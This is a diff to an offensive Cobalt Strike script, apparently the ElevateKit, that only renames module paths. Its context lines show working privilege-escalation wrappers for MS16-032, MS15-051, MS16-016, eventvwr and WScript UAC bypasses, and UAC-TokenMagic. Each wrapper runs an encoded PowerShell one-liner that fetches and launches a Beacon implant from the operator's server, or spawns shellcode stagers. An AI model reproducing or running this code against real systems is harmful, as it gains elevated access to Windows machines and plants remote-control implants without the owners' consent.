@@ -16,7 +16,7 @@ sub ms16_032_exploit {
 	$oneliner = beacon_host_script($1, $script);
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, getFileProper(script_resource("ElevateKit/modules"), "Invoke-MS16032.ps1"));
+	bpowershell_import!($1, getFileProper(script_resource("modules"), "Invoke-MS16032.ps1"));
 	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $oneliner $+ \"");
 
 	# give it another 10s to work.
@@ -42,7 +42,7 @@ sub eventvwr_exploit {
 	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, getFileProper(script_resource("ElevateKit/modules"), "Invoke-EventVwrBypass.ps1"));
+	bpowershell_import!($1, getFileProper(script_resource("modules"), "Invoke-EventVwrBypass.ps1"));
 	bpowerpick!($1, "Invoke-EventVwrBypass -Command \" $+ $oneliner $+ \"");
 
 	# handle staging
@@ -65,7 +65,7 @@ sub wscript_exploit {
 	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, getFileProper(script_resource("ElevateKit/modules"), "Invoke-WScriptBypassUAC.ps1"));
+	bpowershell_import!($1, getFileProper(script_resource("modules"), "Invoke-WScriptBypassUAC.ps1"));
 	bpowerpick!($1, "Invoke-WScriptBypassUAC -payload \" $+ $oneliner $+ \"");
 
 	# handle staging
@@ -84,11 +84,11 @@ sub ms15_051_exploit {
 	# tune our parameters based on the target arch
 	if (-is64 $1) {
 		$arch   = "x64";
-		$dll    = getFileProper(script_resource("ElevateKit/modules"), "cve-2015-1701.x64.dll");
+		$dll    = getFileProper(script_resource("modules"), "cve-2015-1701.x64.dll");
 	}
 	else {
 		$arch   = "x86";
-		$dll    = getFileProper(script_resource("ElevateKit/modules"), "cve-2015-1701.x86.dll");
+		$dll    = getFileProper(script_resource("modules"), "cve-2015-1701.x86.dll");
 	}
 
 	# generate our shellcode
@@ -126,7 +126,7 @@ sub ms16_016_exploit {
 	$stager = shellcode($2, false, "x86");
 
 	# spawn a Beacon post-ex job with the exploit DLL
-	bdllspawn!($1, getFileProper(script_resource("ElevateKit/modules"), "cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+	bdllspawn!($1, getFileProper(script_resource("modules"), "cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
 
 	# stage our payload (if this is a bind payload)
 	bstage($1, $null, $2, $arch);
@@ -170,7 +170,7 @@ sub tokenmagic_exploit {
     $oneliner = powershell_encode_oneliner(beacon_host_script($1, $script));
 
     # run the exploit
-    bpowershell_import!($1, getFileProper(script_resource("ElevateKit/modules"), "UAC-TokenMagic.ps1"));
+    bpowershell_import!($1, getFileProper(script_resource("modules"), "UAC-TokenMagic.ps1"));
     bpowerpick!($1, 'UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c ' . $oneliner . '"');
 
     # handle staging
